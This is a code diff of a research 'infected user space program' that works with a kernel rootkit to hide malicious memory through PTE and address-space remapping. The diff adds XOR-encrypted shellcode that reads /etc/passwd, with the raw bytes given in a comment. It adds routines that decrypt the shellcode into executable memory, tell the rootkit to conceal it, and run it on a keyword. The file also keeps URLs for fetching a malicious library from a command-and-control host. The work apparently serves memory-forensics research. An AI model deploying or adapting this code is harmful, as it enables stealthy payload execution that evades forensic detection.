@@ -1,6 +1,8 @@
 /* norm-proc.c -- infected user space program to demonstrate VMA/PTE hiding
  *
  * Copyright (C) 2019 Patrick Reichenberger
+ * Additional Authors:
+ * Frank Block, ERNW Research GmbH <fblock@ernw.de>
  *
  * This program is free software; you can redistribute it and/or modify
  * it under the terms of the GNU General Public License as published by
@@ -36,6 +38,9 @@
 
 #include <signal.h>
 #include <curl/curl.h>
+#include <pthread.h>
+
+#include "norm-proc.h"
 
 #define NETLINK_USER 31
 #define MAX_PAYLOAD 1024
@@ -43,13 +48,33 @@
 /* Default is the automatic mode. If MANUAL_MODE is defined, the operating mode is the manual mode.
  * This MUST match with the rootkit's operating mode.
  * For automatic mode, comment out the line. */
-//#define MANUAL_MODE
+#define MANUAL_MODE
 
 /* Define the address to download malicious library and benign library */
-#define MAL_URL "http://192.168.15.5:4443/xor-mallib.so"
-#define BEN_URL "http://192.168.15.5:4443/xor-benignlib.so"
+#define MAL_URL "http://192.168.56.1:4443/xor-mallib.so"
+#define BEN_URL "http://192.168.56.1:4443/xor-benignlib.so"
+
+
+// read passwd shellcode - http://shell-storm.org/shellcode/files/shellcode-878.php
+// modifications:  xor encrypted with t0pSecr3t!  ; removed null byte self xor, so page can be rx ; added token: AAAAAAAAAAAAAAAAAA_what.the.eyes.see.and.the.ears.hear..the.mind.believes_AAAAAAAAAAAAAAAAAA
+// original: \xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41
+char encrypted_shellcode[] = "\x9f\x0f\x2f\xc3\xf5\xf3\xe2\x7b\x45\xe1\x70\x32\x38\x62\x93\x6c\x77\x55\xf5\xcd\x8b\x3f\x38\xde\x51\x47\x3a\xba\xb3\x69\x45\xe2\x16\xe9\x9a\x6c\x3a\x02\xb4\x2e\x71\x78\x41\xac\x25\xe3\xb5\x32\x3c\xa8\xb6\x78\x41\x93\x61\x62\x7d\x36\x3c\x10\xb4\x34\x4c\x5c\x60\x8b\xce\xcc\x8b\xde\x5b\x55\x04\x30\x4a\x13\x13\x40\x07\x56\x10\x30\x31\x12\x24\x22\x33\x72\x35\x60\x35\x71\x31\x12\x24\x22\x33\x72\x35\x60\x2b\x47\x18\x32\x11\x4d\x06\x5b\x11\x0f\x11\x49\x15\x20\x4b\x10\x17\x56\x5a\x40\x1a\x54\x5e\x27\x0d\x06\x5c\x56\x15\x53\x07\x1e\x18\x36\x04\x11\x5c\x1d\x00\x49\x11\x1e\x1d\x3a\x0b\x07\x5c\x51\x11\x4d\x1d\x55\x06\x36\x16\x3c\x33\x72\x35\x60\x35\x71\x31\x12\x24\x22\x33\x72\x35\x60\x35\x71\x31\x12\x65";
+int encrypted_shellcode_size = sizeof(encrypted_shellcode)-1;
+void* (*shellcode_func)(void *);
+char key[] = "t0pSecr3t!";
+int keysize = sizeof(key) - 1;
+int token_offset = sizeof(encrypted_shellcode) - 93;
+
+enum {
+    NO_TECHNIQUE,
+    PTE_REMAPPING_TECHNIQUE,
+    PTE_ERASURE_TECHNIQUE,
+    MAS_REMAPPING_TECHNIQUE
+};
 
 int file_size;
+short subversion_technique = NO_TECHNIQUE;
+short subversion_set_up = 0;
 short hiding_enabled = 0;
 #ifdef MANUAL_MODE
 char hiding_cmd[128];
@@ -60,6 +85,12 @@ int malfd;
 char *mallib_name = "mal_dynlib";
 int benfd;
 char *benlib_name = "ben_dynlib";
+
+enum {
+    PRIVATE_MEMORY,
+    SHARED_MEMORY
+};
+
 
 /* Wrapper for the memfd_create system call */
 static inline int memfd_create(const char *name, unsigned int flags) {
@@ -89,6 +120,8 @@ size_t write_data (void *ptr, size_t size, size_t nmemb, int mem_fd) {
         close(mem_fd);
         exit(-1);
     }
+    // remove traces from temporary memory, allocated by curl
+    memset(ptr, 0, nmemb);
 }
 
 // Download our share object from a C&C via HTTPs (https://x-c3ll.github.io/posts/fileless-memfd_create/)
@@ -237,7 +270,7 @@ int send_message_to_kernel(void *msg_content) {
     msgh.msg_iov = &iov;
     msgh.msg_iovlen = 1;
 
-    printf("Send a message to the kernel\n");
+    printf("Sending a message to the kernel...\n");
     /* Send the message to the kernel */
     if(sendmsg(nl_sockfd, &msgh, 0), NLMSG_DATA(nlh) < 0) {
         printf("Error in sending message: %s", strerror(errno));
@@ -321,6 +354,103 @@ void *pte_invalidate_restore() {
     return mal_handle;
 }
 
+
+void *prepare_anon_memory(int memsize, int memory_type){
+    char* mem_addr = NULL;
+
+    // For MAS remapping, we require at least two pages 
+    if (subversion_technique == MAS_REMAPPING_TECHNIQUE && memsize <= 0x1000)
+        return NULL;
+
+    if (memory_type == SHARED_MEMORY){
+        mem_addr = mmap(NULL, memsize, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+        printf("shared memory is here: %p\n", mem_addr);
+
+    }
+    else{
+        mem_addr = mmap(NULL, memsize, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+        printf("private memory is here: %p\n", mem_addr);
+    }
+
+    if (!mem_addr){
+        printf("Memory creation failed. Aborting ... \n");
+        return mem_addr;
+    }
+
+    int i = 0;
+    // With MAS remapping, we leave benign data in the first page
+    if (subversion_technique == MAS_REMAPPING_TECHNIQUE){
+        i = 0x1000;
+        memset(mem_addr, 0x41, 0x1000);
+    }
+
+    char* temp_pointer = NULL;
+    for (; i < memsize; i=i + 0x1000){
+        temp_pointer = (char*)(mem_addr + i);
+        memcpy(temp_pointer, encrypted_shellcode, encrypted_shellcode_size);
+
+        for (int j=0; j<encrypted_shellcode_size; j++)
+            ((char*)temp_pointer)[j] = ((char*)temp_pointer)[j] ^ key[j%keysize];
+    }
+
+    mlock(mem_addr, memsize);
+
+    return mem_addr;
+}
+
+
+/** pte_erasure_restore_anon - manages pte invalidate/restore technique for anonymous memory
+ * 
+ *  First the malicious memory is loaded, i.e. downloaded and loaded.
+ *  Then, the command to hide the malicious memory by invalidating its PTEs is sent to the rootkit.
+ */
+
+void *pte_erasure_restore_anon(int memory_type) {
+    int response_stat;
+    char *mem_addr;
+    int memsize = 0x3000;
+
+    mem_addr = prepare_anon_memory(memsize, memory_type);
+    if (!mem_addr){
+        printf("Memory creation failed. Aborting ... \n");
+        return mem_addr;
+    }
+
+    char vm_start[32];
+    snprintf(vm_start, 32, "%p", mem_addr);
+    /* Send the signal to the rootkit to hide the pages of the malicious library */
+    char *cmd = build_cmd("pteinvalidateanon", vm_start, NULL);
+    #ifdef MANUAL_MODE
+    /* In manual mode, store the command in a global variable in order not to build it each time */
+    strcpy(hiding_cmd, cmd);
+    #endif
+    
+
+    /* Sends hiding command to the rootkit */
+    response_stat = send_message_to_kernel(cmd);
+
+    free(cmd);
+    if(!response_stat) {
+        fprintf(stderr, "Aborting, error in sending message to kernel\n");
+        return 0;
+    }
+
+    #ifdef MANUAL_MODE
+    /* In manual mode, build and store the command in a global variable in order not to build it 
+     * each time when the data is to be restored. */
+    cmd = build_cmd("pterestoreanon", vm_start, NULL);
+    if(cmd) {
+        strcpy(reveal_cmd, cmd);
+        free(cmd);
+    }
+    #endif
+
+    return mem_addr;
+}
+
+
+
+
 /** pte_remap_reset - manages pte remap/reset technique
  * 
  *  First the malicious library is installed, i.e. downloaded and loaded as dynamic library from memory file.
@@ -361,6 +491,107 @@ void *pte_remap_reset() {
 
     return mal_handle;
 }
+
+
+void *pte_remap_reset_anon(int memory_type) {
+    int response_stat;
+
+    char *mem_addr;
+    int memsize = 0x3000;
+
+    mem_addr = prepare_anon_memory(memsize, memory_type);
+    if (!mem_addr){
+        printf("Memory creation failed. Aborting ... \n");
+        return mem_addr;
+    }
+
+    char vm_start[32];
+    snprintf(vm_start, 32, "%p", mem_addr);
+
+    /* Sends hiding command to the rootkit */
+    char *cmd = NULL;
+    if (memory_type == SHARED_MEMORY)
+        cmd = build_cmd("pteremapanon_s", vm_start, NULL);
+    else
+        cmd = build_cmd("pteremapanon_p", vm_start, NULL);
+
+    #ifdef MANUAL_MODE
+    /* In manual mode, store the command in a global variable in order not to build it each time */
+    strcpy(hiding_cmd, cmd);
+    #endif
+
+    response_stat = send_message_to_kernel(cmd);
+    free(cmd);
+    if(!response_stat) {
+        fprintf(stderr, "Aborting, error in sending message to kernel\n");
+        return 0;
+    }
+
+    #ifdef MANUAL_MODE
+    /* In manual mode, build and store the command in a global variable in order not to build it
+     * each time when the data is to be restored. */
+    if (memory_type == SHARED_MEMORY)
+        cmd = build_cmd("pteresetanon_s", vm_start, NULL);
+    else
+        cmd = build_cmd("pteresetanon_p", vm_start, NULL);
+
+    if(cmd) {
+        strcpy(reveal_cmd, cmd);
+        free(cmd);
+    }
+    #endif
+
+    return mem_addr;
+}
+
+
+
+void *mas_remap_reset() {
+    int response_stat;
+
+    char *mem_addr;
+    int memsize = 0x3000;
+
+    mem_addr = prepare_anon_memory(memsize, 0);
+    if (!mem_addr){
+        printf("Memory creation failed. Aborting ... \n");
+        return mem_addr;
+    }
+
+    char vm_start[32];
+    snprintf(vm_start, 32, "%p", mem_addr);
+
+    /* Sends hiding command to the rootkit */
+    char *cmd = NULL;
+    cmd = build_cmd("masremapping", vm_start, NULL);
+
+    #ifdef MANUAL_MODE
+    /* In manual mode, store the command in a global variable in order not to build it each time */
+    strcpy(hiding_cmd, cmd);
+    #endif
+
+    response_stat = send_message_to_kernel(cmd);
+    free(cmd);
+    if(!response_stat) {
+        fprintf(stderr, "Aborting, error in sending message to kernel\n");
+        return 0;
+    }
+
+    #ifdef MANUAL_MODE
+    /* In manual mode, build and store the command in a global variable in order not to build it
+     * each time when the data is to be restored. */
+    cmd = build_cmd("masremapping_reset", vm_start, NULL);
+
+    if(cmd) {
+        strcpy(reveal_cmd, cmd);
+        free(cmd);
+    }
+    #endif
+
+    return mem_addr;
+}
+
+
 
 /** vma_delete - manages vma delete/restore technique
  * 
@@ -423,7 +654,7 @@ void *vma_modify() {
 
     /* Send the signal to the rootkit to modify the limits of the VMAs of the malicious library to the
      * limits of the VMAs of the benign library specified. */
-    char *cmd = build_cmd("vmamodify", mallib_name, benlib_name);
+    char *cmd = build_cmd("vmaremapping", mallib_name, benlib_name);
     #ifdef MANUAL_MODE
     strcpy(hiding_cmd, cmd);
     #endif
@@ -497,12 +728,14 @@ void *pte_vma_delete() {
  *  The command is initialized in the global variable when the initial message to hide the data is sent to the rootkit.
  */
 int reveal_data(void) {
-    if(hiding_enabled) {
+    if(subversion_set_up && hiding_enabled) {
+        fprintf(stderr, "Revealing hidden data\n");
         int response_stat = send_message_to_kernel(reveal_cmd);
         if(!response_stat) {
             fprintf(stderr, "Aborting, error in sending message to kernel\n");
             return -1;
         }
+        hiding_enabled = 0;
         return 0;
     }
 }
@@ -514,20 +747,63 @@ int reveal_data(void) {
  *  The command is initialized in the global variable when the initial message to hide the data is sent to the rootkit.
  */
 int hide_data(void) {
-    if(hiding_enabled) {
+    if(subversion_set_up && !hiding_enabled) {
+        fprintf(stderr, "Hiding malicious data\n");
         int response_stat = send_message_to_kernel(hiding_cmd);
         if(!response_stat) {
             fprintf(stderr, "Aborting, error in sending message to kernel\n");
             return -1;
         }
+        hiding_enabled = 1;
         return 0;
     }
 }
+
+void signal_handler(int signal){
+    printf("\nCaught signal %d, exiting...\n", signal);
+    reveal_data();
+    exit(1);
+}
 #endif
+
+
+void execute_shellcode(void *mal_handle){
+    if(mal_handle) {
+#ifdef MANUAL_MODE
+        if (subversion_technique == MAS_REMAPPING_TECHNIQUE)
+            printf("We are doing MAS remapping, so we don't need to unhide the malicious memory in order to execute it.\n");
+        else
+            reveal_data();
+#endif
+        pthread_t t1;
+        void *s;
+        int offset = 0;
+        if (subversion_technique == MAS_REMAPPING_TECHNIQUE)
+            offset = 0x1000;
+
+        shellcode_func = (void* (*)(void *)) mal_handle + offset;
+        printf("Executing read passwd shellcode at %p...\n\n", shellcode_func);
+        pthread_create(&t1, NULL, shellcode_func, NULL);
+        pthread_join(t1, &s);
+        printf("\n\n");
+#ifdef MANUAL_MODE
+        if (subversion_technique != MAS_REMAPPING_TECHNIQUE)
+            hide_data();
+#endif
+    }
+}
 
 int main() {
     void *mal_handle;
     char string[100];
+
+    struct sigaction signalHandler;
+    signalHandler.sa_handler = signal_handler;
+    sigemptyset(&signalHandler.sa_mask);
+    signalHandler.sa_flags = 0;
+    sigaction(SIGINT, &signalHandler, NULL);
+    sigaction(SIGQUIT, &signalHandler, NULL);
+    sigaction(SIGSEGV, &signalHandler, NULL);
 
     while(1) {
         printf("Enter some string (<100 chars, a-z, A-Z): ");
@@ -537,70 +813,120 @@ int main() {
         if(strlen(string) >= 100) {
             return -1;
         }
-        /* The initial triggers that download the library and hides it.
-         * After initialized, hiding_enabled bit is set to prevent sending the message again */
-        if(!hiding_enabled) {
-            if(!strcmp(string, "load_pteinvalidate")) {
+        if(!subversion_set_up) {
+            if (strcmp(string, "load_pteremapping") == 0) {
+                /* PTE remapping with anonymous memory */
+                subversion_technique = PTE_REMAPPING_TECHNIQUE;
+                if(!(mal_handle = pte_remap_reset_anon(0))) {
+                    return -1;
+                }
+                subversion_set_up = 1;
+                hiding_enabled = 1;
+            } else if (strcmp(string, "load_pteerasure") == 0) {
+                /* PTE erasure with anonymous memory */
+                subversion_technique = PTE_ERASURE_TECHNIQUE;
+                if(!(mal_handle = pte_erasure_restore_anon(0))) {
+                    return -1;
+                }
+                subversion_set_up = 1;
+                hiding_enabled = 1;
+            } else if (strcmp(string, "load_masremapping") == 0) {
+                /* MAS remapping with anonymous memory */
+                subversion_technique = MAS_REMAPPING_TECHNIQUE;
+                if(!(mal_handle = mas_remap_reset())) {
+                    return -1;
+                }
+                subversion_set_up = 1;
+                hiding_enabled = 1;
+#ifdef DELETE_PAGE_CACHE
+            } else if(!strcmp(string, "load_pteinvalidate_lib")) {
                 /* Invalidate/restore PTEs */
+                subversion_technique = PTE_ERASURE_TECHNIQUE;
                 if(!(mal_handle = pte_invalidate_restore())) {
                     return -1;
                 }
+                subversion_set_up = 1;
                 hiding_enabled = 1;
-            } else if (!strcmp(string, "load_pteremap")) {
+            } else if (!strcmp(string, "load_pteremap_lib")) {
                 /* Remap/reset PTEs */
+                subversion_technique = PTE_REMAPPING_TECHNIQUE;
                 if(!(mal_handle = pte_remap_reset())) {
                     return -1;
                 }
+                subversion_set_up = 1;
                 hiding_enabled = 1;
-            } else if (!strcmp(string, "load_vmadelete")) {
-                /* Delete/Restore VMAs */
-                if(!(mal_handle = vma_delete())) {
+            } else if (!strcmp(string, "load_pteremap_s")) {
+                /* PTE remapping with shared memory */
+                subversion_technique = PTE_REMAPPING_TECHNIQUE;
+                if(!(mal_handle = pte_remap_reset_anon(1))) {
                     return -1;
                 }
+                subversion_set_up = 1;
                 hiding_enabled = 1;
-            } else if (!strcmp(string, "load_vmamodify")) {
+            } else if (!strcmp(string, "load_pteerasure_s")) {
+                /* PTE erasure with shared memory */
+                subversion_technique = PTE_ERASURE_TECHNIQUE;
+                if(!(mal_handle = pte_erasure_restore_anon(1))) {
+                    return -1;
+                }
+                subversion_set_up = 1;
+                hiding_enabled = 1;
+            } else if (!strcmp(string, "load_masremapping_lib")) {
                 /* Modify/reset VMAs */
+                subversion_technique = PTE_REMAPPING_TECHNIQUE;
                 if(!(mal_handle = vma_modify())) {
                     return -1;
                 }
+                subversion_set_up = 1;
                 hiding_enabled = 1;
-            } else if (!strcmp(string, "load_ptevmadelete")) {
-                /* Modify/reset VMAs */
-                if(!(mal_handle = pte_vma_delete())) {
-                    return -1;
-                }
-                hiding_enabled = 1;
+#endif
             }
         }
-
-        /* These to keywords should represent triggering malicious actions on certain events. In this case
-         * the events are keywords */
-        if (!strcmp(string, "run_malprint1")) {
-            if(mal_handle) {
-                #ifdef MANUAL_MODE
+        // Hiding already set up
+	    else {
+            if (strcmp(string, "reveal_data") == 0) {
+                /* Unhide hidden data */
                 reveal_data();
-                #endif
-                void (*malicious_print)(void);
-                /* Obtain the address of the function from the malicious library */
-                *(void **)(&malicious_print) = dlsym(mal_handle, "malicious_print");
-                (*malicious_print)();
-                #ifdef MANUAL_MODE
+            } else if (strcmp(string, "hide_data") == 0) {
+                /* Rehide data */
                 hide_data();
-                #endif
+#ifdef DELETE_PAGE_CACHE
+            /* These to keywords should represent triggering malicious actions on certain events. In this case
+            * the events are keywords */
+            } else if (!strcmp(string, "run_malprint1")) {
+                if(mal_handle) {
+                    #ifdef MANUAL_MODE
+                    reveal_data();
+                    #endif
+                    void (*malicious_print)(void);
+                    /* Obtain the address of the function from the malicious library */
+                    *(void **)(&malicious_print) = dlsym(mal_handle, "malicious_print");
+                    (*malicious_print)();
+                    #ifdef MANUAL_MODE
+                    hide_data();
+                    #endif
+                }
+            } else if (!strcmp(string, "run_malprint2")) {
+                /* Obtain the address of the second function from the malicious library */
+                if(mal_handle) {
+                    #ifdef MANUAL_MODE
+                    reveal_data();
+                    #endif
+                    void (*malicious_print2)(void);
+                    *(void **) (&malicious_print2) = dlsym(mal_handle, "malicious_print2");
+                    (*malicious_print2)();
+                    #ifdef MANUAL_MODE
+                    hide_data();
+                    #endif
+                }
+#endif
+            } else if (strcmp(string, "run_shellcode") == 0) {
+                execute_shellcode(mal_handle);
             }
-        } else if (!strcmp(string, "run_malprint2")) {
-            /* Obtain the address of the second function from the malicious library */
-            if(mal_handle) {
-                #ifdef MANUAL_MODE
-                reveal_data();
-                #endif
-                void (*malicious_print2)(void);
-                *(void **) (&malicious_print2) = dlsym(mal_handle, "malicious_print2");
-                (*malicious_print2)();
-                #ifdef MANUAL_MODE
-                hide_data();
-                #endif
-            }
+        } 
+        if (strcmp(string, "exit") == 0) {
+            reveal_data();
+            return 0;
         }
 
         /* Do ROT13 for input */
